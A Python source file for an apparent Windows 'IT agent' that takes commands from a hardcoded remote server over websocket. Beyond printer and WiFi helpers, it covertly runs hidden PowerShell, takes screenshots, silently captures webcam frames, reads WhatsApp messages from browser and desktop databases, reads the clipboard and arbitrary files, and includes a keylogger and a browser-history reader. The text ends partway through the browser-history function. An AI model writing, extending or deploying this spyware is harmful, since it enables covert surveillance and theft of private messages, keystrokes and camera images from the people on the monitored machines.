import asyncio, json, logging, os, sys, base64, subprocess, socket
import psutil, websockets
from pathlib import Path

# Works for both agent.py (script) and YiDingITAgent.exe (PyInstaller)
BASE_DIR = Path(sys.executable).parent if getattr(sys, 'frozen', False) else Path(__file__).parent

# ── Logging ────────────────────────────────────────────────────────────────
_log_handlers = [logging.FileHandler(BASE_DIR / "agent.log", encoding="utf-8")]
try:
    if sys.stdout is not None:
        sys.stdout.fileno()
        _log_handlers.append(logging.StreamHandler())
except Exception:
    pass
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=_log_handlers,
)
log = logging.getLogger(__name__)

try:
    import mss; HAS_MSS = True
except ImportError:
    HAS_MSS = False

# cv2 NOT imported at module level — importing cv2 in venv causes OpenCV to spawn
# a child process (Python312 interpreter) due to DLL linking. Import lazily inside function.

# ── Config ─────────────────────────────────────────────────────────────────
VPS_URL   = "ws://46.225.160.243:9876/agent"
DEVICE_ID = f"PC-{socket.gethostname().upper()}"

# ── AUMID registration ─────────────────────────────────────────────────────
# Windows Toast requires a Start Menu shortcut with AppUserModelId property set.
# Simply writing to the registry is not sufficient for desktop (non-Store) apps.
_aumid_ok = False

_AUMID_CS = r"""
using System; using System.Runtime.InteropServices; using System.Runtime.InteropServices.ComTypes;
public class AumidHelper {
    [Guid("000214F9-0000-0000-C000-000000000046"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IShellLink {
        void GetPath([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder f, int c, IntPtr p, int fl);
        void GetIDList(out IntPtr p); void SetIDList(IntPtr p);
        void GetDescription([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder s, int c);
        void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string s);
        void GetWorkingDirectory([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder s, int c);
        void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string s);
        void GetArguments([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder s, int c);
        void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string s);
        void GetHotkey(out short h); void SetHotkey(short h);
        void GetShowCmd(out int i); void SetShowCmd(int i);
        void GetIconLocation([Out,MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder s, int c, out int i);
        void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string s, int i);
        void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string s, int r);
        void Resolve(IntPtr h, int f);
        void SetPath([MarshalAs(UnmanagedType.LPWStr)] string s);
    }
    [Guid("886D8EEB-8CF2-4446-8D02-CDBA1DBDCF99"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IPropertyStore {
        int GetCount(out uint c); int GetAt(uint i, out PKey k);
        int GetValue(ref PKey k, out PVar v); int SetValue(ref PKey k, ref PVar v); int Commit();
    }
    [StructLayout(LayoutKind.Sequential)] public struct PKey { public Guid fmtid; public uint pid; }
    [StructLayout(LayoutKind.Explicit,Size=16)] public struct PVar { [FieldOffset(0)]public ushort vt; [FieldOffset(8)]public IntPtr p; }
    [Guid("00021401-0000-0000-C000-000000000046"), ClassInterface(ClassInterfaceType.None), ComImport]
    class ShellLink {}
    public static string SetLnkAppId(string lnk, string appId) {
        try {
            var sl=(IShellLink)new ShellLink();
            var pf=(IPersistFile)sl;
            pf.Load(lnk, 2);
            var ps=(IPropertyStore)sl;
            var k=new PKey{fmtid=new Guid("9F4C2855-9F79-4B39-A8D0-E1D42DE1D5F3"),pid=5};
            var v=new PVar{vt=31,p=Marshal.StringToCoTaskMemUni(appId)};
            int hr=ps.SetValue(ref k,ref v); Marshal.FreeCoTaskMem(v.p);
            if(hr!=0) return "SetValue hr="+hr;
            hr=ps.Commit(); if(hr!=0) return "Commit hr="+hr;
            pf.Save(lnk,true);
            return "OK";
        } catch(Exception ex){return "ERR:"+ex.Message;}
    }
}
"""

async def _compile_launcher_exe(ico_path: Path, exe_out: Path):
    """Compile YiDingITAgent.exe with embedded YiDing ICO for notification attribution icon."""
    csc_candidates = [
        r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
    ]
    csc = next((p for p in csc_candidates if Path(p).exists()), None)
    if not csc:
        return
    cs_code = (
        "using System; using System.Diagnostics; using System.IO;\n"
        "class YiDingITAgent {\n"
        "    [STAThread] static void Main() {\n"
        "        string d = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);\n"
        "        string py = Path.Combine(d, \"venv\", \"Scripts\", \"pythonw.exe\");\n"
        "        string sc = Path.Combine(d, \"agent.py\");\n"
        "        if (!File.Exists(py)) return;\n"
        "        Process.Start(new ProcessStartInfo {\n"
        "            FileName = py, Arguments = \"\\\"\" + sc + \"\\\"\",\n"
        "            WorkingDirectory = d, UseShellExecute = false });\n"
        "    }\n"
        "}\n"
    )
    import tempfile
    fd, cs_file = tempfile.mkstemp(suffix=".cs")
    try:
        with os.fdopen(fd, "w") as f:
            f.write(cs_code)
        cmd = [csc, "/target:winexe", f"/out:{exe_out}"]
        if ico_path.exists():
            cmd.append(f"/win32icon:{ico_path}")
        cmd.append(cs_file)
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        await asyncio.to_thread(
            subprocess.run, cmd, capture_output=True, timeout=30,
            startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception:
        pass
    finally:
        try: Path(cs_file).unlink()
        except Exception: pass


async def _ensure_aumid():
    global _aumid_ok
    if _aumid_ok:
        return

    ico_path = BASE_DIR / "yiding_logo.ico"
    png_path = BASE_DIR / "yiding_logo.png"

    # Rebuild ICO from PNG: square-pad + remove black background + proper sizes
    try:
        src = png_path if png_path.exists() else None
        if src:
            from PIL import Image
            img = Image.open(src).convert("RGBA")
            side = max(img.width, img.height)
            sq = Image.new("RGBA", (side, side), (0, 0, 0, 0))
            sq.paste(img, ((side - img.width) // 2, (side - img.height) // 2))
            # Remove near-black background pixels
            pixels = list(sq.getdata())
            sq.putdata([(r, g, b, 0) if r + g + b < 60 else (r, g, b, a)
                        for r, g, b, a in pixels])
            sq.save(str(ico_path), format="ICO",
                    sizes=[(16, 16), (32, 32), (48, 48), (64, 64), (256, 256)])
    except Exception:
        pass

    # Compile wrapper EXE with icon embedded (for notification attribution icon)
    launcher_exe = BASE_DIR / "YiDingITAgent.exe"
    if not launcher_exe.exists():
        await _compile_launcher_exe(ico_path, launcher_exe)

    # Shortcut target: wrapper EXE (icon embedded) preferred; fallback to pythonw.exe
    if launcher_exe.exists():
        target = str(launcher_exe)
        icon_ps = ""
        args_ps = ""
    else:
        target = str(Path(sys.executable))
        icon_ps = f'$s.IconLocation="{str(ico_path)},0";' if ico_path.exists() else ""
        args_ps = f'$s.Arguments=\'{str(BASE_DIR / "agent.py")}\';'

    script = f"""
Add-Type -TypeDefinition @'
{_AUMID_CS}
'@ -ErrorAction SilentlyContinue

$appId   = 'YiDing.ITAgent'
$lnkDir  = [IO.Path]::Combine($env:APPDATA,'Microsoft\\Windows\\Start Menu\\Programs')
$lnkPath = [IO.Path]::Combine($lnkDir,'YiDing IT Agent.lnk')
if (Test-Path $lnkPath) {{ Remove-Item $lnkPath -Force }}

$ws = New-Object -ComObject WScript.Shell
$s  = $ws.CreateShortcut($lnkPath)
$s.TargetPath      = '{target}'
$s.WorkingDirectory= '{str(BASE_DIR)}'
$s.Description     = 'YiDing IT Agent'
{icon_ps}
{args_ps}
$s.Save()

[AumidHelper]::SetLnkAppId($lnkPath, $appId) | Out-Null

$sig = '[DllImport("shell32.dll")]public static extern void SHChangeNotify(int e,int f,IntPtr a,IntPtr b);'
Add-Type -MemberDefinition $sig -Name WinShellNotify -Namespace Win32 -ErrorAction SilentlyContinue
[Win32.WinShellNotify]::SHChangeNotify(0x08000000,0,[IntPtr]::Zero,[IntPtr]::Zero)

$rp = "HKCU:\\SOFTWARE\\Classes\\AppUserModelId\\$appId"
if(-not(Test-Path $rp)){{New-Item $rp -Force|Out-Null}}
Set-ItemProperty $rp -Name 'DisplayName' -Value 'YiDing IT Agent'
Set-ItemProperty $rp -Name 'IconUri'     -Value '{str(ico_path)}'
"""
    await act_powershell(script, timeout=30)
    _aumid_ok = True

# ── Actions ────────────────────────────────────────────────────────────────
async def act_system_info():
    cpu  = await asyncio.to_thread(psutil.cpu_percent, 1)
    ram  = psutil.virtual_memory().percent
    disk = psutil.disk_usage("C:\\").percent
    return f"CPU: {cpu}% | RAM: {ram}% | Disk: {disk}%"

async def act_screenshot():
    if not HAS_MSS:
        return "Error: mss not installed"
    def _shot():
        import io
        from PIL import Image
        with mss.mss() as sct:
            raw = sct.grab(sct.monitors[0])
            img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
        # Resize if wider than 1280px, then JPEG compress
        if img.width > 1280:
            h = int(img.height * 1280 / img.width)
            img = img.resize((1280, h), Image.LANCZOS)
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=82)
        return base64.b64encode(buf.getvalue()).decode()
    return await asyncio.to_thread(_shot)

async def act_list_dir(path):
    def _list():
        p = Path(path)
        if not p.exists(): return json.dumps({"error": "Path not found"})
        return json.dumps([
            {"name": i.name, "type": "dir" if i.is_dir() else "file"}
            for i in list(p.iterdir())[:50]
        ])
    return await asyncio.to_thread(_list)

async def act_powershell(command, timeout=30):
    def _run():
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0  # SW_HIDE
            r = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", command],
                capture_output=True, text=True, timeout=timeout,
                startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW,
            )
            return (r.stdout + r.stderr).strip()
        except subprocess.TimeoutExpired: return "Error: timed out"
        except Exception as e: return f"Error: {e}"
    return await asyncio.to_thread(_run)

async def act_get_processes():
    def _get():
        procs = []
        for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
            try: procs.append(p.info)
            except: pass
        return json.dumps(sorted(procs, key=lambda x: x.get("cpu_percent") or 0, reverse=True)[:30])
    return await asyncio.to_thread(_get)

async def act_kill_process(target):
    try:
        if str(target).isdigit():
            psutil.Process(int(target)).kill(); return f"Killed PID {target}"
        killed = 0
        for p in psutil.process_iter(["name"]):
            if p.info["name"].lower() == target.lower():
                p.kill(); killed += 1
        return f"Killed {killed} process(es) named '{target}'"
    except Exception as e: return f"Error: {e}"

async def act_open_app(path):
    try: subprocess.Popen(path); return f"Opened: {path}"
    except Exception as e: return f"Error: {e}"

async def act_send_notification(title, message, image_b64=None):
    await _ensure_aumid()

    def _xe(s):
        return str(s).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'","&apos;")

    # Avatar nhan vien: appLogoOverride = o vuong nho canh title (lien ket voi avatar Live Panel)
    avatar = BASE_DIR / "chichi.png"
    if not avatar.exists():
        avatar = BASE_DIR / "chichi.jpg"

    avatar_tag = ""
    if avatar.exists():
        uri = str(avatar).replace('\\', '/').replace(' ', '%20')
        avatar_tag = f'<image placement="appLogoOverride" src="file:///{uri}"/>'

    # Anh dinh kem tu admin (base64) → hero (o to tren cung) — CHI KHI ADMIN GUI
    hero_tag = ""
    _tmp_img = None
    if image_b64:
        try:
            import tempfile, base64 as _b64
            img_bytes = _b64.b64decode(image_b64)
            ext = ".png" if img_bytes[:4] == b'\x89PNG' else ".jpg"
            _tmp_img = Path(tempfile.mktemp(suffix=ext, dir=BASE_DIR))
            _tmp_img.write_bytes(img_bytes)
            uri3 = str(_tmp_img).replace('\\', '/').replace(' ', '%20')
            hero_tag = f'<image placement="hero" src="file:///{uri3}"/>'
        except Exception:
            hero_tag = ""

    xml_body = (
        f'<toast><visual><binding template="ToastGeneric">'
        f'{hero_tag}'
        f'{avatar_tag}'
        f'<text>{_xe(title)}</text>'
        f'<text>{_xe(message)}</text>'
        f'</binding></visual></toast>'
    )
    xml_ps = xml_body.replace("'", "''")

    script = "\n".join([
        "[void][Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]",
        "[void][Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]",
        "$d=New-Object Windows.Data.Xml.Dom.XmlDocument",
        f"$d.LoadXml('{xml_ps}')",
        "[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('YiDing.ITAgent').Show((New-Object Windows.UI.Notifications.ToastNotification $d))",
    ])
    result = await act_powershell(script, timeout=12)
    if _tmp_img and _tmp_img.exists():
        try: _tmp_img.unlink()
        except Exception: pass
    if result.lower().startswith("error"): return result
    return f"Đã gửi: {message}"

async def act_network_info():
    def _get():
        h = socket.gethostname()
        try: ip = socket.gethostbyname(h)
        except: ip = "unknown"
        return json.dumps({"hostname": h, "ip": ip})
    return await asyncio.to_thread(_get)

async def act_read_file(path):
    try: return Path(path).read_text(encoding="utf-8", errors="ignore")[:5000]
    except Exception as e: return f"Error: {e}"

async def act_capture_camera(camera_index=0):
    """Capture one frame from webcam silently — no window, no camera app.
    LED will briefly flash (~0.5s) as hardware requires it when sensor is active."""
    def _capture():
        try:
            import cv2  # lazy import — avoid spawning child process at startup
        except ImportError:
            return "Error: opencv-python not installed"
        try:
            # CAP_DSHOW = DirectShow backend on Windows — fastest open/close, no GUI
            cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
            if not cap.isOpened():
                return "Error: camera not found or in use"
            # Discard first frame (sensor warm-up noise), grab second
            cap.read()
            ret, frame = cap.read()
            cap.release()
            if not ret or frame is None:
                return "Error: could not capture frame"
            # Encode to JPEG in memory → base64
            ok, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
            if not ok:
                return "Error: encode failed"
            return base64.b64encode(buf.tobytes()).decode()
        except Exception as e:
            return f"Error: {e}"
    return await asyncio.to_thread(_capture)

async def act_save_avatar(data):
    try:
        img_bytes = base64.b64decode(data)
        # Detect format from header: PNG starts 0x89 0x50, JPEG starts 0xFF 0xD8
        is_png = len(img_bytes) >= 4 and img_bytes[:4] == b'\x89PNG'
        out = BASE_DIR / ("chichi.png" if is_png else "chichi.jpg")
        out.write_bytes(img_bytes)
        # Remove the other format so only one exists (avoids stale fallback)
        other = BASE_DIR / ("chichi.jpg" if is_png else "chichi.png")
        if other.exists(): other.unlink(missing_ok=True)
        return f"Avatar saved ({len(img_bytes)} bytes, {'PNG' if is_png else 'JPEG'})"
    except Exception as e: return f"Error: {e}"

# ── Printer actions ────────────────────────────────────────────────────────
async def act_list_printers():
    r = await act_powershell(
        "Get-Printer | Select-Object Name,"
        "@{N='Status';E={$_.PrinterStatus.ToString()}},"
        "Default,PortName | ConvertTo-Json -Compress",
        timeout=12
    )
    return r or "[]"

async def act_get_print_queue():
    r = await act_powershell(
        "$jobs=@(); Get-Printer | ForEach-Object {"
        " try { $jobs += Get-PrintJob -PrinterName $_.Name -EA Stop } catch {} };"
        "if($jobs){ $jobs | Select-Object JobStatus,Document,UserName,TotalPages | ConvertTo-Json -Compress }"
        "else { '[]' }",
        timeout=12
    )
    return r.strip() or "[]"

async def act_clear_print_queue(printer=""):
    if printer:
        cmd = f"Get-PrintJob -PrinterName '{printer}' | Remove-PrintJob; 'Cleared: {printer}'"
    else:
        cmd = ("$n=0; Get-Printer | ForEach-Object { "
               "try { Get-PrintJob -PrinterName $_.Name -EA Stop | ForEach-Object { Remove-PrintJob $_; $n++ } } catch {} };"
               "\"Cleared $n job(s)\"")
    return await act_powershell(cmd, timeout=15)

async def act_set_default_printer(name):
    cmd = f"(New-Object -ComObject WScript.Network).SetDefaultPrinter('{name}'); 'Default set: {name}'"
    return await act_powershell(cmd, timeout=10)

async def act_install_printer_ip(ip, name, driver="Generic / Text Only"):
    if not ip or not name:
        return "Error: ip and name required"
    safe_ip   = ip.replace("'", "")
    safe_name = name.replace("'", "")
    safe_drv  = driver.replace("'", "")
    cmd = (
        f"$port='{safe_ip}'; $pname='{safe_name}'; $drv='{safe_drv}';"
        f"if(-not(Get-PrinterPort -Name $port -EA SilentlyContinue)){{"
        f"  Add-PrinterPort -Name $port -PrinterHostAddress $port }}"
        f"if(-not(Get-Printer -Name $pname -EA SilentlyContinue)){{"
        f"  Add-Printer -Name $pname -DriverName $drv -PortName $port }}"
        f"'Installed: '+$pname+' -> '+$port"
    )
    return await act_powershell(cmd, timeout=30)

async def act_print_file(path, printer=""):
    if not Path(path).exists():
        return f"Error: file not found: {path}"
    safe_path = path.replace('"', '')
    if printer:
        safe_printer = printer.replace('"', '')
        cmd = f'Start-Process -FilePath "{safe_path}" -Verb PrintTo -ArgumentList "{safe_printer}"'
    else:
        cmd = f'Start-Process -FilePath "{safe_path}" -Verb Print'
    r = await act_powershell(cmd, timeout=60)
    return r if r else f"Print job sent: {Path(path).name}"

async def act_read_whatsapp_db(date_from=None, date_to=None):
    """
    Đọc tin nhắn WhatsApp từ Chrome/Edge IndexedDB hoặc WhatsApp Desktop.
    date_from / date_to: chuỗi "YYYY-MM-DD" (tuỳ chọn).
    """
    import tempfile, shutil
    from datetime import datetime, timezone

    def _parse_dt(s):
        if not s:
            return None
        try:
            return datetime.strptime(s, "%Y-%m-%d").replace(tzinfo=timezone.utc)
        except Exception:
            return None

    def _ts_ok(ts):
        """ts có thể là giây hoặc mili-giây."""
        if ts is None:
            return True
        try:
            val = float(ts)
            if val > 1e12:          # milliseconds → seconds
                val /= 1000
            dt = datetime.fromtimestamp(val, tz=timezone.utc)
            if dt_from and dt < dt_from:
                return False
            if dt_to   and dt > dt_to:
                return False
            return True
        except Exception:
            return True

    dt_from = _parse_dt(date_from)
    dt_to   = _parse_dt(date_to)
    messages  = []
    src_info  = []
    local_app = Path(os.environ.get("LOCALAPPDATA", ""))

    # ── 1. Chrome / Edge  WhatsApp Web IndexedDB ───────────────────────────
    try:
        import ccl_chromium_indexeddb  # type: ignore
        HAS_CCL = True
    except ImportError:
        HAS_CCL = False

    browser_roots = {
        "Chrome": local_app / "Google/Chrome/User Data/Default/IndexedDB",
        "Edge":   local_app / "Microsoft/Edge/User Data/Default/IndexedDB",
    }

    for bname, idb_root in browser_roots.items():
        if not idb_root.exists():
            continue
        wa_idb = None
        try:
            for d in idb_root.iterdir():
                if "web.whatsapp.com" in d.name and d.is_dir():
                    wa_idb = d
                    break
        except Exception:
            pass

        if not wa_idb:
            src_info.append(f"{bname}: WhatsApp Web IndexedDB not found")
            continue

        tmp_dir = Path(tempfile.mkdtemp(prefix="wa_idb_"))
        try:
            dst = tmp_dir / "wa_idb"
            shutil.copytree(str(wa_idb), str(dst))
            if HAS_CCL:
                try:
                    env = ccl_chromium_indexeddb.WrappedIndexDB(str(dst))
                    for db_rec in env.databases():
                        for store_name in db_rec.object_store_names:
                            if any(k in store_name.lower() for k in ("message", "msg", "chat")):
                                try:
                                    for record in db_rec[store_name].get_all():
                                        val = record.value
                                        if not isinstance(val, dict):
                                            continue
                                        ts = val.get("t") or val.get("timestamp") or val.get("ts")
                                        if not _ts_ok(ts):
                                            continue
                                        messages.append({
                                            "source": bname,
                                            "from":   str(val.get("from") or val.get("author") or ""),
                                            "body":   str(val.get("body") or val.get("text") or "")[:500],
                                            "ts":     ts,
                                        })
                                except Exception:
                                    pass
                    src_info.append(f"{bname}: parsed OK")
                except Exception as e:
                    src_info.append(f"{bname}: ccl error – {e}")
            else:
                total_kb = sum(f.stat().st_size for f in dst.rglob("*") if f.is_file()) // 1024
                src_info.append(
                    f"{bname}: WhatsApp Web IDB found ({total_kb} KB) – "
                    f"cài 'ccl-chromium-indexeddb' để đọc tin nhắn"
                )
        except Exception as e:
            src_info.append(f"{bname}: copy error – {e}")
        finally:
            shutil.rmtree(str(tmp_dir), ignore_errors=True)

    # ── 2. WhatsApp Desktop (Windows Store app) ────────────────────────────
    pkgs = local_app / "Packages"
    if pkgs.exists():
        try:
            for pkg in pkgs.iterdir():
                if "whatsapp" not in pkg.name.lower():
                    continue
                ls = pkg / "LocalState"
                if not ls.exists():
                    continue
                db_files = list(ls.glob("*.db")) + list(ls.glob("*.sqlite"))
                if db_files:
                    import sqlite3
                    SQLITE_MAGIC = b'SQLite format 3\x00'
                    for db_path in db_files[:3]:
                        tmp_db = Path(tempfile.mktemp(suffix=".db"))
                        try:
                            shutil.copy2(str(db_path), str(tmp_db))
                            # Kiem tra header truoc khi mo SQLite
                            header = tmp_db.read_bytes()[:16]
                            if header != SQLITE_MAGIC[:16]:
                                src_info.append(f"WhatsApp Desktop: {db_path.name} encrypted (SQLCipher) – khong doc duoc")
                                tmp_db.unlink(missing_ok=True)
                                continue
                            conn = sqlite3.connect(str(tmp_db))
                            cur  = conn.cursor()
                            tables = [r[0] for r in cur.execute(
                                "SELECT name FROM sqlite_master WHERE type='table'"
                            ).fetchall()]
                            for tbl in tables:
                                if not any(k in tbl.lower() for k in ("message","msg","chat")):
                                    continue
                                try:
                                    cols = [c[1] for c in cur.execute(
                                        f"PRAGMA table_info({tbl})"
                                    ).fetchall()]
                                    ts_col   = next((c for c in cols if any(k in c.lower() for k in ("time","ts","date"))), None)
                                    body_col = next((c for c in cols if any(k in c.lower() for k in ("body","text","content","message"))), None)
                                    from_col = next((c for c in cols if any(k in c.lower() for k in ("from","sender","author","jid"))), None)
                                    if not body_col:
                                        continue
                                    sel = f"SELECT {ts_col or 'NULL'}, {from_col or 'NULL'}, {body_col} FROM {tbl} ORDER BY rowid DESC LIMIT 200"
                                    for row in cur.execute(sel).fetchall():
                                        ts_v, from_v, body_v = row
                                        if not body_v or not _ts_ok(ts_v):
                                            continue
                                        messages.append({
                                            "source": f"WhatsApp Desktop/{tbl}",
                                            "from":   str(from_v or ""),
                                            "body":   str(body_v)[:500],
                                            "ts":     ts_v,
                                        })
                                except Exception:
                                    pass
                            conn.close()
                            src_info.append(f"WhatsApp Desktop: SQLite OK – tables {tables[:5]}")
                        except Exception as e:
                            src_info.append(f"WhatsApp Desktop: SQLite error – {e}")
                        finally:
                            tmp_db.unlink(missing_ok=True)
                else:
                    ldb = [d for d in ls.iterdir() if d.is_dir() and (d / "CURRENT").exists()]
                    if ldb:
                        src_info.append(
                            f"WhatsApp Desktop: LevelDB found ({len(ldb)} dbs) – "
                            f"cài 'plyvel' để đọc"
                        )
                    else:
                        src_info.append(f"WhatsApp Desktop: found at {pkg.name}, không có DB đọc được")
        except Exception as e:
            src_info.append(f"WhatsApp Desktop scan error: {e}")

    # ── 3. Kết quả ────────────────────────────────────────────────────────
    if not messages and not src_info:
        return json.dumps({"error": "Không tìm thấy dữ liệu WhatsApp", "status": "not_found"}, ensure_ascii=False)

    messages.sort(key=lambda x: x.get("ts") or 0, reverse=True)
    return json.dumps({
        "status":        "ok",
        "message_count": len(messages),
        "messages":      messages[:200],
        "sources":       src_info,
        "date_range":    {"from": date_from, "to": date_to},
    }, ensure_ascii=False, indent=2)


async def act_print_data(data: str, filename: str = "document.pdf", mime: str = ""):
    """Nhận file base64, lưu tạm rồi in."""
    import tempfile, base64 as _b64
    try:
        raw = _b64.b64decode(data)
        ext = Path(filename).suffix or ".pdf"
        tmp = Path(tempfile.mktemp(suffix=ext, dir=BASE_DIR))
        tmp.write_bytes(raw)
        result = await act_print_file(str(tmp))
        try: tmp.unlink(missing_ok=True)
        except: pass
        return result if result else f"Print job sent: {filename}"
    except Exception as e:
        return f"Error: {e}"

# ── WiFi actions ───────────────────────────────────────────────────────────
async def act_wifi_list():
    """Liệt kê WiFi hiện tại và các profile đã lưu."""
    r = await act_powershell(
        "$cur=(netsh wlan show interfaces | Select-String '^ *SSID' | Select-Object -First 1)"
        ".ToString().Split(':',2)[1].Trim();"
        "$profiles=@(netsh wlan show profiles | Select-String 'All User Profile'"
        " | ForEach-Object { $_.ToString().Split(':',2)[1].Trim() });"
        "\"Current: $cur\"; \"---\"; $profiles",
        timeout=10
    )
    return r.strip() or "Không có WiFi info"

async def act_wifi_connect(ssid: str):
    """Kết nối tới WiFi profile đã lưu theo tên SSID."""
    if not ssid:
        return "Error: ssid required"
    r = await act_powershell(f"netsh wlan connect name='{ssid.replace(chr(39),'')}' ", timeout=15)
    return r.strip()

async def act_wifi_print(target_wifi: str, file_data: str = "", file_path: str = "",
                         filename: str = "document.pdf", printer: str = ""):
    """Đổi WiFi → in file → đổi lại WiFi cũ → toast xác nhận.
    Dùng khi máy in và máy tính ở khác wifi.
    Kết quả báo qua Windows notification vì WebSocket tạm ngắt lúc đổi WiFi.
    """
    if not target_wifi:
        return "Error: target_wifi required"
    if not file_data and not file_path:
        return "Error: cần file_data (base64) hoặc file_path"

    # Lưu WiFi hiện tại để quay về
    cur = await act_powershell(
        "(netsh wlan show interfaces | Select-String '^ *SSID' | Select-Object -First 1)"
        ".ToString().Split(':',2)[1].Trim()",
        timeout=8
    )
    original_wifi = cur.strip()
    safe_target   = target_wifi.replace("'", "")
    safe_orig     = original_wifi.replace("'", "")
    log.info(f"wifi_print: '{original_wifi}' → '{target_wifi}'")

    # Đổi sang WiFi máy in
    await act_powershell(f"netsh wlan connect name='{safe_target}'", timeout=15)

    # Đợi kết nối (tối đa 20s)
    connected = False
    for _ in range(10):
        await asyncio.sleep(2)
        chk = await act_powershell(
            "(netsh wlan show interfaces | Select-String '^ *SSID' | Select-Object -First 1)"
            ".ToString().Split(':',2)[1].Trim()",
            timeout=6
        )
        if safe_target.lower() in chk.strip().lower():
            connected = True
            break

    if not connected:
        if safe_orig:
            await act_powershell(f"netsh wlan connect name='{safe_orig}'", timeout=15)
        msg = f"Không kết nối được '{target_wifi}' sau 20s"
        await act_send_notification("🖨 YiDing Print", msg)
        return f"Error: {msg}"

    # In file
    if file_data:
        print_result = await act_print_data(file_data, filename)
    else:
        print_result = await act_print_file(file_path, printer)

    await asyncio.sleep(3)  # đợi lệnh vào print queue

    # Quay lại WiFi cũ
    if safe_orig and safe_orig.lower() != safe_target.lower():
        await act_powershell(f"netsh wlan connect name='{safe_orig}'", timeout=15)
        log.info(f"wifi_print: back to '{original_wifi}'")

    # Toast xác nhận (WebSocket có thể ngắt tạm khi đổi WiFi)
    ok = "Error" not in (print_result or "")
    await act_send_notification(
        "🖨 In xong" if ok else "🖨 Lỗi in",
        f"{filename}" if ok else print_result[:120]
    )
    log.info(f"wifi_print done: {print_result}")
    return print_result


# ═══════════════════════════════════════════════════════
# VECTOR v5.0 — NEW CAPABILITIES
# ═══════════════════════════════════════════════════════

import urllib.request as _ureq, urllib.parse as _uparse

VECTOR_VERSION = "5.0"

async def act_clipboard_read():
    return await act_powershell(
        "Add-Type -Assembly PresentationCore; [Windows.Clipboard]::GetText()", timeout=10)

async def act_clipboard_write(text: str):
    s = text.replace("'", "''")
    await act_powershell(
        f"Add-Type -Assembly PresentationCore; [Windows.Clipboard]::SetText('{s}')", timeout=10)
    return "clipboard_write:ok"

async def act_keylogger_session(duration_sec: int = 15):
    if duration_sec > 60: duration_sec = 60
    ps = f"""
Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices; using System.Text;
public class KL5 {{
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
    [DllImport("user32.dll")] public static extern int GetKeyboardLayout(uint t);
    [DllImport("user32.dll")] public static extern bool GetKeyboardState(byte[] b);
    [DllImport("user32.dll")] public static extern int ToUnicodeEx(uint vk, uint sc, byte[] ks, StringBuilder sb, int c, uint f, IntPtr h);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr h, out uint p);
}}
"@ -EA SilentlyContinue
$log=New-Object System.Text.StringBuilder; $end=(Get-Date).AddSeconds({duration_sec})
while((Get-Date) -lt $end){{
    Start-Sleep -ms 30
    $hw=[KL5]::GetForegroundWindow(); $tid=0u
    [KL5]::GetWindowThreadProcessId($hw,[ref]$tid)|Out-Null
    $hkl=[IntPtr]::new([KL5]::GetKeyboardLayout($tid))
    $ks=New-Object byte[] 256; [KL5]::GetKeyboardState($ks)|Out-Null
    for($vk=8;$vk -le 255;$vk++){{
        if(([KL5]::GetAsyncKeyState($vk) -band 1) -eq 1){{
            $sb=New-Object System.Text.StringBuilder 5
            $r=[KL5]::ToUnicodeEx($vk,0,$ks,$sb,5,0,$hkl)
            if($r -gt 0){{$log.Append($sb.ToString())|Out-Null}}
            elseif($vk -eq 8) {{$log.Append("[BS]")|Out-Null}}
            elseif($vk -eq 13){{$log.Append("[ENTER]`n")|Out-Null}}
            elseif($vk -eq 9) {{$log.Append("[TAB]")|Out-Null}}
            elseif($vk -eq 32){{$log.Append(" ")|Out-Null}}
        }}
    }}
}}
$log.ToString()
"""
    return await act_powershell(ps, timeout=duration_sec + 10)

async def act_browser_history(browser: str = "all", limit: int = 50):
    ps = f"""
$limit={limit}; $res=@(); $paths=@()
if("{browser}" -in "chrome","all"){{ $p="$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History"; if(Test-Path $p){{$paths+=@{{b="Chrome";p=$p}}}} }}
if("{browser}" -in "edge","all")  {{ $p="$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\History"; if(Test-Path $p){{$paths+=@{{b="Edge";p=$p}}}} }}
foreach($h in $paths){{
    $tmp="$env:TEMP\\hist$(Get-Random).db"; Copy-Item $h.p $tmp -Force -EA SilentlyContinue
    if(!(Test-Path $tmp)){{continue}}
    $sq=(Get-Command sqlite3 -EA SilentlyContinue)?.Source
    if($sq){{
